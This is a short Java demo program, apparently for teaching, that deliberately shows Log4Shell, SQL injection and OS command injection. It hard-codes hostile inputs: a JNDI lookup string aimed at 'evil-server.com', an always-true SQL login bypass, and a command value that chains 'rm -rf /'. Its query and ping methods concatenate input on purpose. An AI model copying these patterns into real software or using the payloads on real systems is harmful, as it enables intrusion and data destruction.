package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class App {

    // VULNERABILITY: Using a vulnerable logging framework version (Log4Shell)
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        System.out.println("[⚠️] Starting App with Intentional Vulnerabilities...\n");

        // Simulating untrusted user inputs
        String maliciousLogInput = "${jndi:ldap://://evil-server.com}";
        String maliciousQueryInput = "admin' OR '1'='1";
        String maliciousCommandInput = "local-ping; rm -rf /"; 

        // 1. Log4Shell Demonstration
        // Logging user-controlled strings directly allows JNDI lookups in this Log4j version
        logger.info("Processing user input: " + maliciousLogInput);

        // 2. SQL Injection Demonstration
        executeVulnerableQuery(maliciousQueryInput);

        // 3. Command Injection Demonstration
        executeVulnerableCommand(maliciousCommandInput);
    }

    /**
     * VULNERABILITY: SQL Injection
     * Direct string concatenation allows an attacker to alter the SQL command structure.
     */
    private static void executeVulnerableQuery(String userInput) {
        String url = "jdbc:h2:mem:test;DB_CLOSE_DELAY=-1";
        try (Connection conn = DriverManager.getConnection(url, "sa", "");
             Statement stmt = conn.createStatement()) {
            
            // Faulty practice: concatenation instead of PreparedStatement
            String query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = 'password'";
            System.out.println("[Executing SQL]: " + query);
            
            ResultSet rs = stmt.executeQuery(query);
            while (rs.next()) {
                System.out.println("User found: " + rs.getString("username"));
            }
        } catch (Exception e) {
            System.err.println("SQL Error: " + e.getMessage());
        }
    }

    /**
     * VULNERABILITY: OS Command Injection
     * Passing unsanitized user inputs into a system shell executor.
     */
    private static void executeVulnerableCommand(String userInput) {
        // Faulty practice: Constructing OS commands natively with user variables
        String command = "ping -c 1 " + userInput;
        System.out.println("[Executing OS Command]: " + command);

        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            System.err.println("Command Executive Error: " + e.getMessage());
        }
    }
}
